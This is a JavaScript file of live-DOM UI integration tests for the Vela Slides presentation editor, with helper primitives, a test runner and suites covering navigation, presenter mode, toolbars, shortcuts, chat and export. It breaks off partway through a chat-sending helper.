// © 2025-present Rui Quintino. Vela Slides — licensed under ELv2. See LICENSE.
// ━━━ Vela UI Integration Tests ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// Zero-dependency UI test runner that operates on the live DOM.
// Triggered via Ctrl+Alt+T or the "🧪 UI" button in the battery toast.
// Tests run against whatever deck is loaded — demo deck recommended.

// ── Test Primitives ──────────────────────────────────────────────────
const _$ = (sel, root = document) => root.querySelector(sel);
const _$$ = (sel, root = document) => Array.from(root.querySelectorAll(sel));
const _$text = (text, tag = "*") => _$$(tag).find((el) => el.textContent?.includes(text));
const _wait = (ms) => new Promise((r) => setTimeout(r, ms));
const _waitFor = async (fn, timeout = 3000, interval = 50) => {
  const start = Date.now();
  while (Date.now() - start < timeout) {
    try { const r = fn(); if (r) return r; } catch {}
    await _wait(interval);
  }
  throw new Error(`waitFor timed out after ${timeout}ms`);
};
const _click = (elOrSel) => {
  const el = typeof elOrSel === "string" ? _$(elOrSel) : elOrSel;
  if (!el) throw new Error(`click: element not found: ${elOrSel}`);
  el.dispatchEvent(new PointerEvent("pointerdown", { bubbles: true }));
  el.dispatchEvent(new PointerEvent("pointerup", { bubbles: true }));
  el.click();
  return el;
};
const _key = (key, opts = {}) => {
  const target = document.activeElement || document.body;
  const ev = new KeyboardEvent("keydown", { key, bubbles: true, cancelable: true, ...opts });
  target.dispatchEvent(ev);
};
// Current global slide position (1-based) and total. Prefers the serve.py /
// desktop test hook (window.__velaGetCurrentSlide); falls back to the padded
// "NN / NN" counter SlideContent renders on the displayed slide. The thumbnail
// rail uses an unpadded "N/total" with no surrounding spaces, so the spaced
// regex below won't match it. Returns null when no slide is on screen.
const _slideCounterEl = () => _$$("*").find((el) => el.children.length === 0 && /^\d+ \/ \d+$/.test((el.textContent || "").trim()));
const _slidePos = () => {
  try {
    const hook = typeof window !== "undefined" && window.__velaGetCurrentSlide;
    if (typeof hook === "function") { const r = hook(); if (r && r.slide_number) return r.slide_number; }
  } catch {}
  const el = _slideCounterEl();
  return el ? parseInt(el.textContent.trim(), 10) : null;
};
const _slideTotal = () => {
  const el = _slideCounterEl();
  return el ? parseInt(el.textContent.trim().split("/")[1], 10) : null;
};
const _type = (el, text) => {
  const target = typeof el === "string" ? _$(el) : el;
  if (!target) throw new Error(`type: element not found`);
  target.focus();
  // Strategy 1: React-compatible native setter (preferred)
  let set = false;
  try {
    const proto = target.tagName === "TEXTAREA" ? HTMLTextAreaElement.prototype : HTMLInputElement.prototype;
    const desc = Object.getOwnPropertyDescriptor(proto, "value");
    if (desc && desc.set) { desc.set.call(target, text); set = true; }
  } catch {}
  // Strategy 2: direct value + React internal tracker reset
  if (!set) {
    // React tracks value via an internal property — delete it so React sees the change
    const tracker = target._valueTracker;
    if (tracker) tracker.setValue("");
    target.value = text;
  }
  target.dispatchEvent(new Event("input", { bubbles: true }));
  target.dispatchEvent(new Event("change", { bubbles: true }));
};

// Bring the editor to a known-good state before a suite that needs a slide on
// screen: dismiss any overlay/fullscreen a prior suite may have left open, then
// select the first module so a slide renders. Mirrors the bootstrap recipe in
// tests/test_review_ui.cjs. Harness-independent — safe to run in-app (a module
// is usually already selected) and headless (nothing selected yet). No-ops
// cleanly when there is no module list (mobile/empty deck).
const _selectFirstModule = async () => {
  document.activeElement?.blur();
  for (let i = 0; i < 2; i++) { _key("Escape"); await _wait(80); }
  const row = _$(".concept-row");
  if (!row) return;
  _click(row);
  await _waitFor(
    () => _slidePos() != null || _$$("[data-block-type]").length > 0,
    2500
  ).catch(() => {});
};

// ── Test Runner ──────────────────────────────────────────────────────
const UI_TEST_SUITES = [];

// A suite may pass an optional `setup` (beforeAll) that runs once before its
// tests — used to guarantee editor state (a selected slide) for suites that
// would otherwise fail headless when no module has been clicked yet.
function uiSuite(name, tests, opts = {}) {
  UI_TEST_SUITES.push({ name, tests, setup: opts.setup });
}

async function runUITests(onProgress) {
  const allResults = [];
  let total = UI_TEST_SUITES.reduce((s, suite) => s + suite.tests.length, 0);
  let done = 0, passed = 0, failed = 0, skipped = 0;

  for (const suite of UI_TEST_SUITES) {
    if (typeof suite.setup === "function") {
      try { await suite.setup(); } catch {}
    }
    for (const test of suite.tests) {
      done++;
      if (onProgress) onProgress({ done, total, suite: suite.name, test: test.name, phase: "running", passed, failed, skipped, results: allResults });
      const t0 = performance.now();
      // Tests flagged requiresAI degrade to a visible skip (not a failure) when
      // Vera AI is unavailable (offline/keyless) — see CR-02.
      if (test.requiresAI && typeof velaAIAvailable === "function" && !velaAIAvailable()) {
        skipped++;
        allResults.push({ suite: suite.name, name: test.name, pass: "skip", error: "AI unavailable — skipped", ms: Math.round(performance.now() - t0) });
        if (onProgress) onProgress({ done, total, suite: suite.name, test: test.name, phase: "done", passed, failed, skipped, results: [...allResults] });
        await _wait(20);
        continue;
      }
      try {
        await test.fn();
        passed++;
        allResults.push({ suite: suite.name, name: test.name, pass: true, ms: Math.round(performance.now() - t0) });
      } catch (e) {
        failed++;
        allResults.push({ suite: suite.name, name: test.name, pass: false, error: e?.message || String(e), ms: Math.round(performance.now() - t0) });
      }
      if (onProgress) onProgress({ done, total, suite: suite.name, test: test.name, phase: "done", passed, failed, skipped, results: [...allResults] });
      await _wait(20);
    }
  }
  return allResults;
}

// Headless entry point for automated browser drivers (see the vela-live-render
// skill / vela-drive.js). Runs every suite and resolves to the results array,
// also stashing it on window.__velaUITestResults for pollers.
if (typeof window !== "undefined") {
  window.__velaRunUITests = async () => {
    const results = await runUITests();
    window.__velaUITestResults = results;
    return results;
  };
}

// ━━━ TEST SUITES ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

// ── Render Suite ─────────────────────────────────────────────────────
uiSuite("Render", [
  { name: "App header visible", fn: async () => {
    await _waitFor(() => _$("header"));
  }},
  { name: "Vela icon in header", fn: async () => {
    await _waitFor(() => _$("header svg"));
  }},
  { name: "Deck title visible", fn: async () => {
    await _waitFor(() => {
      const spans = _$$("header span");
      return spans.some((s) => s.textContent && s.textContent.length > 1 && s.style.fontWeight >= 700);
    });
  }},
  { name: "At least 1 slide renders", fn: async () => {
    // Slide counter or slide content area should exist
    await _waitFor(() => _$text("/") || _$text("Slide") || _$$("[style*='transform']").length > 0);
  }},
  { name: "Module list or slide content present", fn: async () => {
    // Either the module list is visible (desktop) or slide content is rendered (mobile, slides tab)
    await _waitFor(() => {
      const allText = document.body.textContent || "";
      return allText.length > 200; // App has meaningful content rendered
    });
  }},
]);

// ── Navigation Suite ─────────────────────────────────────────────────
uiSuite("Navigation", [
  { name: "Arrow right advances slide", fn: async () => {
    // Rewind toward the start so there's room to advance.
    for (let i = 0; i < 8; i++) { _key("ArrowLeft"); await _wait(40); }
    await _wait(150);
    const before = _slidePos();
    if (before == null) throw new Error("No slide on screen to navigate");
    const total = _slideTotal();
    if (total != null && total <= 1) return; // single-slide deck: nothing to advance
    _key("ArrowRight");
    // The slide index must actually move forward, not just "not crash".
    await _waitFor(() => { const p = _slidePos(); return p != null && p > before; });
  }},
  { name: "Arrow left goes back", fn: async () => {
    const before = _slidePos();
    if (before == null) throw new Error("No slide on screen to navigate");
    if (before <= 1) { // already at the first slide — assert we can still advance
      _key("ArrowRight");
      await _waitFor(() => { const p = _slidePos(); return p != null && p > before; });
      return;
    }
    _key("ArrowLeft");
    await _waitFor(() => { const p = _slidePos(); return p != null && p < before; });
  }},
  { name: "Multiple navigation round-trips to start", fn: async () => {
    const start = _slidePos();
    for (let i = 0; i < 3; i++) { _key("ArrowRight"); await _wait(100); }
    for (let i = 0; i < 3; i++) { _key("ArrowLeft"); await _wait(100); }
    // Equal forward/back steps must land back where we started.
    if (start != null) await _waitFor(() => _slidePos() === start);
  }},
], { setup: _selectFirstModule });

// ── Presenter Suite ──────────────────────────────────────────────────
uiSuite("Presenter", [
  { name: "F key enters fullscreen", fn: async () => {
    _key("f");
    const fs = await _waitFor(() => _$("[style*='position: fixed'][style*='z-index']") || _$("[style*='position:fixed']"), 1500).catch(() => null);
    if (!fs) throw new Error("No fixed fullscreen element found");
  }},
  { name: "Fullscreen shows slide content", fn: async () => {
    await _waitFor(() => {
      const fixed = _$("[style*='position: fixed'][style*='z-index']") || _$("[style*='position:fixed']");
      return fixed && fixed.textContent.length > 10;
    });
  }},
  { name: "Arrow navigation works in fullscreen", fn: async () => {
    const a = _slidePos();
    _key("ArrowRight");
    await _wait(250);
    const b = _slidePos();
    _key("ArrowLeft");
    await _wait(250);
    const c = _slidePos();
    // Assert real movement (changed then restored), not just absence of a crash.
    // Tolerant of virtual section-divider cards: checks change + return, not +1.
    if (a != null && b != null) {
      if (b === a) throw new Error("ArrowRight did not change slide in fullscreen");
      if (c != null && c !== a) throw new Error("ArrowLeft did not return to the original slide");
    }
  }},
  { name: "Present mode shows no edit chrome (CR-03)", fn: async () => {
    // A presented slide must show ZERO edit affordances: no dashed hover-outline
    // (EditableText), no ghost "+" icon-slot marker (EditableIcon with no value),
    // no floating pencil/edit button. Scoped to the fullscreen container only.
    const fs = _$("[style*='position: fixed'][style*='z-index']") || _$("[style*='position:fixed']");
    if (!fs) throw new Error("No fixed fullscreen element found");
    const all = _$$("*", fs);
    const dashedOutline = all.filter((el) => el.style?.outlineStyle === "dashed");
    if (dashedOutline.length > 0) throw new Error(`found ${dashedOutline.length} dashed-outline edit-chrome element(s) while presenting`);
    const ghostPlus = all.filter((el) => el.children.length === 0 && (el.textContent || "").trim() === "+");
    if (ghostPlus.length > 0) throw new Error(`found ${ghostPlus.length} ghost "+" affordance(s) while presenting`);
    const pencil = _$$("button", fs).filter((el) => (el.textContent || "").includes("✏"));
    if (pencil.length > 0) throw new Error(`found ${pencil.length} pencil edit button(s) while presenting`);
  }},
  { name: "F key exits fullscreen", fn: async () => {
    _key("f");
    await _waitFor(() => _$("header"));
  }},
], { setup: _selectFirstModule });

// ── Toolbar Suite ────────────────────────────────────────────────────
uiSuite("Toolbar", [
  { name: "Slide toolbar visible", fn: async () => {
    await _waitFor(() => {
      const buttons = _$$("button");
      return buttons.some((b) => b.textContent?.includes("Edit") || b.textContent?.includes("✏"));
    });
  }},
  { name: "Edit button exists (✏️)", fn: async () => {
    // CR-11 renamed the pencil to "⚡ AI Edit". Its title is AI-state dependent
    // (degrades to the AI-unavailable message when keyless), so match the stable
    // label too — identifies the same edit affordance headless or in-artifact.
    await _waitFor(() => _$$("button").find((b) => b.title?.includes("Edit") || b.textContent?.includes("✏") || b.textContent?.includes("AI Edit")));
  }},
  { name: "Edit button renamed to AI Edit (CR-11)", fn: async () => {
    // The bottom-toolbar Edit button was renamed to disambiguate that it is
    // AI-gated (⚡ AI Edit), not a generic non-AI editing affordance.
    await _waitFor(() => _$$("button").find((b) => b.textContent?.includes("AI Edit")));
  }},
  { name: "Improve button exists (✨)", fn: async () => {
    await _waitFor(() => _$$("button").find((b) => b.title?.includes("Improve") || b.textContent?.includes("✨")));
  }},
  { name: "Variants button exists (🎲)", fn: async () => {
    await _waitFor(() => _$$("button").find((b) => b.title?.includes("variant") || b.title?.includes("alternative") || b.textContent?.includes("🎲")));
  }},
  { name: "New slide button exists (+)", fn: async () => {
    await _waitFor(() => _$$("button").find((b) => b.title?.includes("New slide") || b.textContent?.includes("New")));
  }},
  { name: "Cost badge visible only in artifact mode (💲)", fn: async () => {
    // Token/cost stats render only as a Claude.ai artifact (metered proxy). In
    // desktop / local-serve / test runtimes the badge is intentionally absent.
    const artifact = typeof velaIsArtifactMode === "function" && velaIsArtifactMode();
    const present = () => !!_$$("button").find((b) => (b.textContent || "").includes("💲"));
    if (artifact) { await _waitFor(present); }
    else if (present()) throw new Error("cost badge should be hidden outside artifact mode");
  }},
  { name: "Delete button exists (🗑)", fn: async () => {
    await _waitFor(() => _$$("button").find((b) => b.title?.includes("Delete") || b.textContent?.includes("🗑")));
  }},
], { setup: _selectFirstModule });

// ── Theme Suite ──────────────────────────────────────────────────────
uiSuite("Theme", [
  { name: "Theme has dark or light mode applied", fn: async () => {
    const header = _$("header");
    if (!header) throw new Error("No header");
    const bg = header.style.background || header.style.backgroundColor;
    if (!bg) throw new Error("Header has no inline background style");
  }},
  { name: "D key toggles theme", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    const headerBefore = _$("header").style.background;
    _key("d");
    await _waitFor(() => _$("header").style.background !== headerBefore, 1500).catch(() => {});
    const headerAfter = _$("header").style.background;
    // Toggle back
    _key("d");
    await _waitFor(() => _$("header").style.background !== headerAfter, 1500).catch(() => {});
    if (headerBefore === headerAfter) throw new Error("D key didn't toggle theme");
  }},
]);

// ── Keyboard Shortcuts Suite ─────────────────────────────────────────
uiSuite("Keyboard", [
  { name: "E opens quick edit panel", fn: async () => {
    // Ensure no input/textarea is focused (keyboard shortcuts skip those)
    document.activeElement?.blur();
    await _wait(100);
    _key("e");
    const panel = await _waitFor(() => _$$("input, textarea").find((el) => el.placeholder?.toLowerCase().includes("change") || el.placeholder?.toLowerCase().includes("edit")), 1000).catch(() => null);
    // Close it
    _key("Escape");
    await _wait(100);
    if (!panel) throw new Error("Quick edit panel not found after E key");
  }},
  { name: "N opens new slide prompt", fn: async () => {
    document.activeElement?.blur();
    await _wait(100);
    _key("n");
    const panel = await _waitFor(() => _$$("textarea").find((el) => el.placeholder?.toLowerCase().includes("describe")), 1000).catch(() => null);
    _key("Escape");
    await _wait(100);
    if (!panel) throw new Error("New slide panel not found after N key");
  }},
  { name: "? shows help / shortcut guide", fn: async () => {
    document.activeElement?.blur();
    await _wait(100);
    _key("?");
    await _waitFor(() => _$text("Shortcuts") || _$text("shortcuts") || _$text("⌨"), 800).catch(() => {});
    _key("Escape");
    await _wait(100);
    // Some builds may not have ? shortcut — soft pass
  }},
  { name: "Esc closes popups", fn: async () => {
    document.activeElement?.blur();
    await _wait(100);
    _key("e"); // open something
    await _waitFor(() => _$$("input, textarea").find((el) => el.placeholder?.toLowerCase().includes("change") || el.placeholder?.toLowerCase().includes("edit")), 800).catch(() => {});
    _key("Escape");
    await _wait(120);
    // Should be back to normal — no crash
  }},
], { setup: _selectFirstModule });

// ── Chat Suite ───────────────────────────────────────────────────────
uiSuite("Chat", [
  { name: "Vera chat panel opens", fn: async () => {
    // Clean slate — dismiss any leftover popups from previous suite
    document.activeElement?.blur(); await _wait(50);
    _key("Escape"); await _wait(120);
    _key("Escape"); await _wait(120);
    // Click Vera button — retry if first click is swallowed by closing popup
    for (let attempt = 0; attempt < 3; attempt++) {
      const btn = _$$("button").find((b) => b.textContent?.includes("Vera") || b.textContent?.includes("🤖"));
      if (btn) _click(btn);
      // Check if chat opened (textarea or VERA header) — poll, returns as soon as it opens
      const opened = await _waitFor(() => _$$("textarea").find((t) => {
        const ph = t.placeholder?.toLowerCase() || "";
        return ph.includes("tell vera") || ph.includes("paste images");
      }) || _$$("span").find((s) => s.textContent?.trim() === "VERA"), 600).catch(() => null);
      if (opened) return;
    }
    throw new Error("Chat panel did not open after 3 attempts");
  }},
  { name: "Chat input visible", requiresAI: true, fn: async () => {
    await _waitFor(() => _$$("textarea").find((t) => {
      const ph = t.placeholder?.toLowerCase() || "";
      return ph.includes("tell vera") || ph.includes("paste images") || ph.includes("ask");
    }));
  }},
  { name: "Welcome message shown", fn: async () => {
    await _waitFor(() => _$text("Welcome") || _$text("⛵") || _$text("🖖"));
  }},
  { name: "Send button present", fn: async () => {
    await _waitFor(() => _$$("button").find((b) => (b.textContent || "").trim() === "↑"));
  }},
  { name: "Chat panel closes", fn: async () => {
    const btn = _$$("button").find((b) => b.textContent?.includes("Vera") || b.textContent?.includes("🤖"));
    if (btn) _click(btn);
    await _wait(300);
  }},
]);

// ── Notes Suite ──────────────────────────────────────────────────────
uiSuite("Notes", [
  { name: "Notes bar visible", fn: async () => {
    await _waitFor(() => _$text("NOTES"));
  }},
  { name: "Notes expand on click", fn: async () => {
    const notesLabel = _$text("NOTES");
    if (notesLabel) {
      const clickable = notesLabel.closest("[style*='cursor: pointer']") || notesLabel.parentElement;
      if (clickable) _click(clickable);
      await _wait(200);
      const ta = _$("#vela-notes-area") || _$$("textarea").find((t) => t.placeholder?.includes("notes") || t.placeholder?.includes("Speaker"));
      if (ta) {
        // Collapse back
        if (clickable) _click(clickable);
        await _wait(100);
      }
    }
  }},
], { setup: _selectFirstModule });

// ── Export Suite ──────────────────────────────────────────────────────
uiSuite("Export", [
  { name: "JSON modal opens", fn: async () => {
    let btn = _$$("button").find((b) => {
      const t = (b.textContent || "").replace(/\s+/g, " ").trim();
      return t.includes("JSON") && !t.includes("Export");
    });
    if (!btn) {
      const exportBtn = _$$("button").find((b) => (b.textContent || "").includes("Export"));
      if (exportBtn) { _click(exportBtn); btn = await _waitFor(() => _$$("button").find((b) => (b.textContent || "").includes("Copy") && (b.textContent || "").includes("JSON")), 1200).catch(() => null); }
    }
    if (!btn) {
      const menuBtn = _$$("button").find((b) => (b.textContent || "").trim() === "⋯");
      if (menuBtn) { _click(menuBtn); btn = await _waitFor(() => _$$("button").find((b) => (b.textContent || "").includes("JSON") && !(b.textContent || "").includes("Export")), 1200).catch(() => null); }
    }
    if (!btn) throw new Error("JSON button not found");
    _click(btn);
    const modal = await _waitFor(() => _$$("textarea").find((t) => { try { const v = t.value || ""; return v.includes("concepts") || v.includes("_vela") || v.includes("slides") || v.includes("lanes"); } catch { return false; } }), 2000).catch(() => null);
    _key("Escape"); await _wait(200); _key("Escape"); await _wait(100);
    if (!modal) throw new Error("JSON modal textarea not found");
  }},
]);

// ── Batch Edit Suite (UI only — no API calls) ───────────────────────
uiSuite("Batch Edit", [
  { name: "Batch edit panel opens", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    // Find Batch button in header or ⋯ menu
    let btn = _$$("button").find((b) => (b.textContent || "").includes("Batch") && !(b.textContent || "").includes("Stop"));
    if (!btn) {
      const menuBtn = _$$("button").find((b) => (b.textContent || "").trim() === "⋯");
      if (menuBtn) { _click(menuBtn); await _wait(300); btn = _$$("button").find((b) => (b.textContent || "").includes("Batch") || (b.textContent || "").includes("Improve")); }
    }
    if (!btn) throw new Error("Batch button not found");
    _click(btn); await _wait(300);
  }},
  { name: "Scope selector visible", fn: async () => {
    // Look for scope options: slide, module, section, all
    await _waitFor(() => {
      const all = document.body.textContent || "";
      return (all.includes("slide") || all.includes("Slide")) && (all.includes("module") || all.includes("Module") || all.includes("all") || all.includes("All"));
    }, 1000);
  }},
  { name: "Prompt input visible", requiresAI: true, fn: async () => {
    const ta = await _waitFor(() => _$$("input, textarea").find((t) => {
      const ph = t.placeholder?.toLowerCase() || "";
      return ph.includes("change across") || ph.includes("auto-improve") || ph.includes("persistent") || ph.includes("every improve");
    }), 1000).catch(() => null);
    if (!ta) throw new Error("Batch prompt input not found");
  }},
  { name: "Close batch panel", fn: async () => {
    // Click the batch button again to toggle off, or find close
    const btn = _$$("button").find((b) => (b.textContent || "").includes("Batch") || (b.textContent || "").includes("⏹") || (b.textContent || "").includes("Improve"));
    if (btn) _click(btn);
    await _wait(200);
  }},
]);

// ── Branding Suite (UI only) ─────────────────────────────────────────
uiSuite("Branding", [
  { name: "Branding panel opens", fn: async () => {
    let btn = _$$("button").find((b) => (b.textContent || "").includes("Brand"));
    if (!btn) {
      const menuBtn = _$$("button").find((b) => (b.textContent || "").trim() === "⋯");
      if (menuBtn) { _click(menuBtn); await _wait(300); btn = _$$("button").find((b) => (b.textContent || "").includes("Brand")); }
    }
    if (!btn) throw new Error("Brand button not found");
    _click(btn); await _wait(300);
  }},
  { name: "Guidelines textarea visible", fn: async () => {
    // The guidelines textarea is behind a collapsible "SLIDE RULES" toggle
    // Click any element containing "SLIDE RULES" or "RULES" text
    const allSpans = _$$("span");
    const rulesToggle = allSpans.find((s) => s.textContent?.trim() === "SLIDE RULES");
    if (rulesToggle) {
      // Click the parent div (the toggle container)
      const container = rulesToggle.parentElement;
      if (container) { _click(container); await _wait(300); }
    }
    // Look for the textarea with placeholder about "Persistent rules"
    const ta = await _waitFor(() => _$$("textarea").find((t) => {
      const ph = t.placeholder || "";
      return ph.includes("Persistent") || ph.includes("persistent") || ph.includes("EVERY improve") || ph.includes("bullets");
    }), 1500).catch(() => null);
    // Collapse back if we found the toggle
    if (rulesToggle?.parentElement) { _click(rulesToggle.parentElement); await _wait(100); }
    if (!ta) throw new Error("Guidelines textarea not found");
  }},
  { name: "Close branding panel", fn: async () => {
    const btn = _$$("button").find((b) => (b.textContent || "").includes("Brand"));
    if (btn) _click(btn);
    await _wait(200);
  }},
]);

// ── About / Changelog Suite ──────────────────────────────────────────
uiSuite("About", [
  { name: "About dialog opens on icon click", fn: async () => {
    const icon = _$("header svg");
    if (!icon) throw new Error("Vela icon not found");
    const clickTarget = icon.closest("span") || icon.parentElement || icon;
    _click(clickTarget);
    const version = await _waitFor(() => _$text("v9.") || _$text("v8.") || _$text(VELA_VERSION), 1000).catch(() => null);
    if (!version) throw new Error("Version text not found in about dialog");
  }},
  { name: "Changelog entries visible", fn: async () => {
    await _waitFor(() => _$text("v" + VELA_VERSION) || _$text("Recent Changes"));
  }},
  { name: "About dialog closes", fn: async () => {
    _key("Escape"); await _wait(200);
    // Or click the ✕ button
    const close = _$$("button").find((b) => (b.textContent || "").includes("✕"));
    if (close) _click(close);
    await _wait(200);
  }},
]);

// ── Undo/Redo Suite ──────────────────────────────────────────────────
uiSuite("Undo/Redo", [
  { name: "Ctrl+Z doesn't crash", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    _key("z", { ctrlKey: true });
    await _wait(200);
    // App still renders
    if (!_$("header")) throw new Error("App disappeared after undo");
  }},
  { name: "Ctrl+Shift+Z doesn't crash", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    _key("z", { ctrlKey: true, shiftKey: true });
    await _wait(200);
    if (!_$("header")) throw new Error("App disappeared after redo");
  }},
]);

// ── Fullscreen Features Suite ────────────────────────────────────────
uiSuite("Fullscreen Features", [
  { name: "Font scale + increases", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    _key("f");
    await _waitFor(() => _$("[style*='position: fixed']"), 1500).catch(() => {});
    _key("+"); await _wait(80);
    // Look for font scale indicator
    const indicator = _$text("FONT") || _$text("110%") || _$text("120%");
    _key("0"); await _wait(60); // reset
  }},
  { name: "Font scale - decreases", fn: async () => {
    _key("-"); await _wait(80);
    _key("0"); await _wait(60); // reset
  }},
  { name: "Font scale 0 resets", fn: async () => {
    _key("+"); await _wait(60);
    _key("+"); await _wait(60);
    _key("0"); await _wait(80);
    // Indicator should disappear at 100%
  }},
  { name: "Space advances slide in fullscreen", fn: async () => {
    _key(" "); await _wait(120);
    _key("ArrowLeft"); await _wait(120); // go back
  }},
  { name: "Exit fullscreen", fn: async () => {
    _key("f");
    await _waitFor(() => _$("header"));
  }},
]);

// ── Slide Operations Suite (non-destructive) ─────────────────────────
uiSuite("Slide Ops", [
  { name: "Duplicate button exists and works", fn: async () => {
    // Find slide counter before
    const getCounter = () => {
      const spans = _$$("span").filter((s) => /^\d+\s*\/\s*\d+$/.test(s.textContent?.trim()));
      return spans[0]?.textContent?.trim() || null;
    };
    const before = getCounter();
    // Click duplicate
    const btn = _$$("button").find((b) => b.textContent?.includes("📋") || b.title?.includes("Duplicate"));
    if (btn) {
      _click(btn);
      // Wait for the duplicate to commit (slide count changes) before undoing.
      if (before != null) await _waitFor(() => getCounter() !== before, 1200).catch(() => {});
      else await _wait(300);
      // Undo immediately to restore state
      document.activeElement?.blur(); await _wait(50);
      _key("z", { ctrlKey: true });
      // Wait for undo to restore the original slide count before continuing.
      if (before != null) await _waitFor(() => getCounter() === before, 1200).catch(() => {});
      else await _wait(200);
    }
  }},
  { name: "Move button shows module list", fn: async () => {
    const btn = _$$("button").find((b) => b.textContent?.includes("📦") || b.title?.includes("Move"));
    if (!btn) throw new Error("Move button not found");
    _click(btn);
    const popup = await _waitFor(() => _$text("Move to") || _$$("button").find((b) => {
      const t = b.textContent || "";
      return t.includes("Block Showcase") || t.includes("Introduction") || t.includes("Hands");
    }), 1200).catch(() => null);
    // Close popup — click the backdrop overlay (fixed inset div) or toggle button
    const backdrop = _$$("div").find((d) => d.style.position === "fixed" && d.style.inset === "0px" && d.style.zIndex === "9998");
    if (backdrop) { _click(backdrop); await _wait(200); }
    else { _click(btn); await _wait(200); } // toggle off
  }},
  { name: "Comment input accepts input", fn: async () => {
    // 💬 icon only visible in review mode — activate it first
    document.activeElement?.blur(); await _wait(100);
    _key("r");
    const commentIcon = await _waitFor(() => _$$("span").find((s) => s.textContent?.includes("💬") && s.style?.cursor === "pointer"), 1500).catch(() => null);
    if (commentIcon) {
      _click(commentIcon); await _wait(200);
      const input = _$$("input").find((i) => i.placeholder?.includes("Add comment"));
      if (input) {
        if (input.readOnly || input.disabled) throw new Error("Comment input is not editable");
      }
      // Collapse
      _click(commentIcon); await _wait(100);
    }
    // Exit review mode
    _key("r"); await _wait(300);
  }},
  { name: "Duration editor opens on click", fn: async () => {
    const timer = _$$("span").find((s) => s.textContent?.includes("⏱") && s.style?.cursor === "pointer");
    if (timer) {
      _click(timer); await _wait(200);
      const input = _$$("input").find((i) => i.type === "number");
      // Close by pressing Escape
      _key("Escape"); await _wait(100);
    }
    // Soft pass if no timer visible
  }},
]);

// ── Slide Content Suite ──────────────────────────────────────────────
uiSuite("Content", [
  { name: "Slide has visible headings", fn: async () => {
    const headings = _$$("[style*='font-weight: 700'], [style*='font-weight: 800'], [style*='font-weight:700'], [style*='font-weight:800']");
    const visible = headings.filter((h) => h.offsetHeight > 0 && h.textContent?.length > 1);
    if (visible.length === 0) throw new Error("No visible heading elements found");
  }},
  { name: "Slide has multiple blocks", fn: async () => {
    const blocks = _$$("[data-block-type]");
    if (blocks.length === 0) throw new Error("No data-block-type elements — blocks not rendering");
  }},
  { name: "Slide counter shows valid format", fn: async () => {
    const counter = _slideCounterEl();
    if (!counter) throw new Error("No slide counter (N/M format) found");
    const [n, m] = counter.textContent.trim().split("/").map((s) => parseInt(s.trim()));
    if (n < 1 || m < 1 || n > m) throw new Error(`Invalid counter: ${n}/${m}`);
  }},
]);

// ── New Deck Dialog Suite ────────────────────────────────────────────
uiSuite("New Deck", [
  { name: "New Deck dialog opens", fn: async () => {
    // Find + button in header
    const btn = _$$("button").find((b) => {
      const t = (b.textContent || "").trim();
      return t === "+" || t === "+ New" || (b.title || "").includes("New Deck");
    });
    if (!btn) throw new Error("New Deck button not found");
    _click(btn); await _wait(300);
    // Dialog should show title input and prompt textarea
    const dialog = await _waitFor(() => {
      const inputs = _$$("input");
      const textareas = _$$("textarea");
      return inputs.some((i) => i.placeholder?.includes("Presentation") || i.placeholder?.includes("My"))
        || textareas.some((t) => t.placeholder?.toLowerCase().includes("pitch deck") || t.placeholder?.toLowerCase().includes("10-slide") || t.placeholder?.toLowerCase().includes("create"));
    }, 1500).catch(() => null);
    if (!dialog) throw new Error("New Deck dialog fields not found");
  }},
  { name: "Dialog has Cancel button", fn: async () => {
    const cancel = _$$("button").find((b) => (b.textContent || "").includes("Cancel"));
    if (!cancel) throw new Error("Cancel button not found in dialog");
  }},
  { name: "Dialog closes on Cancel", fn: async () => {
    const cancel = _$$("button").find((b) => (b.textContent || "").includes("Cancel"));
    if (cancel) _click(cancel);
    await _wait(200);
  }},
]);

// ── Presenter Advanced Suite ─────────────────────────────────────────
uiSuite("Presenter Adv", [
  { name: "F5 enters fullscreen", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    _key("F5");
    const fs = await _waitFor(() => _$("[style*='position: fixed'][style*='z-index']") || _$("[style*='position:fixed']"), 1500).catch(() => null);
    if (!fs) throw new Error("F5 didn't enter fullscreen");
  }},
  { name: "Minimize button visible", fn: async () => {
    await _waitFor(() => _$$("svg").find((s) => s.closest("[class*='slide-nav-btn']") || s.closest("[style*='padding: 8px']")));
  }},
  { name: "Exit via F", fn: async () => {
    _key("f");
    await _waitFor(() => _$("header"));
  }},
]);

// ── Vera AI Integration Suite (live API calls) ──────────────────────
// Helper: open chat, type message, send, wait for response
const _veraChat = async (message, timeout = 45000) => {
  document.activeElement?.blur(); await _wait(100);

  // Ensure chat is open
  const findTa = () => _$$("textarea").find((t) => {
    const ph = t.placeholder?.toLowerCase() || "";
    return ph.includes("tell vera") || ph.includes("paste images");
  });

  if (!findTa()) {
    const veraBtn = _$$("button").find((b) => b.textContent?.includes("Vera") || b.textContent?.includes("🤖"));
    if (veraBtn) { _click(veraBtn); await _wait(400); }
    await _waitFor(findTa, 3000);
  }

  // Wait for any previous call to finish
  await _waitFor(() => {
    const body = document.body.textContent || "";
    const btn = _$$("button").find((b) => (b.textContent || "").trim() === "↑");
    return !body.includes("working...") && btn;
  }, 30000);
  await _wait(500);

  // Re-find textarea (React may have re-rendered after previous response)
  const ta = findTa();
  if (!ta) throw new Error("Chat textarea not found after wait");

  // Type via React-compatible method
  ta.focus(); await _wait(50);
  const tracker = ta._valueTracker;
  if (tracker) tracker.setValue("");
  const nativeSetter = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value")?.set;
  try { if (nativeSetter) nativeSetter.call(ta, message); else ta.value = message; } catch { ta.value = message; }
  ta.dispatchEvent(new Event("input", { bubbles: true }));
  ta.dispatchEvent(new Event("change", { bubbles: true }));
  await _wait(200);

  if (!ta.value.includes(message.slice(0, 10))) throw new Error("React did not accept typed input");

  // Click send — retry until button is enabled
  let sent = false;
  for (let attempt = 0; attempt < 20; attempt++) {
    const sendBtn = _$$("button").find((b) => (b.textContent || "").trim() === "↑" && !b.disabled);
    if (sendBtn) { _click(sendBtn); sent = true; break; }
    await _wait(500);
  }
  if (!sent) throw new Error("Send button not found or disabled after retries");
  await _wait(500);

  // Wait for response
